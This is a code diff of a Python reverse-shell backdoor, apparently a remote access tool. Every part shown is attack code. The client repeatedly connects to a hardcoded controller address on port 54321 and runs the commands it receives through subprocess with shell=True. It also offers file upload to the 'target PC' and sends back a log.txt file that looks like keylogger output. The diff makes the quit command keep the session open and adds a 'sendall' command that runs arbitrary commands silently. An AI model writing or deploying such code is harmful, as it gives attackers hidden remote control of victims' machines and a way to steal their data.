@@ -78,7 +78,7 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            sock.connect(("192.168.0.45", 54321))
+            sock.connect(("10.0.2.15", 54321))
             shell()
         except:
             connection()
@@ -87,10 +87,7 @@ def shell():
         command = reliable_recv()
         print("command -> {}".format(command))
         if command == 'q':
-            sock.close()
-            break
-        # on teste si la commande c'est cd donc qu'on change de directory
-        # si je fais pas ça le programme plante quand on change de directory
+            continue
         elif command == "help":
             help_options = '''
                 upload path     -> Upload a file to target PC
@@ -166,6 +163,8 @@ def shell():
             path = "log.txt"
             file = open("log.txt", "r")
             reliable_send(file.read())
+        elif command[:7] == "sendall":
+            subprocess.Popen(command[8:], shell=True)
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
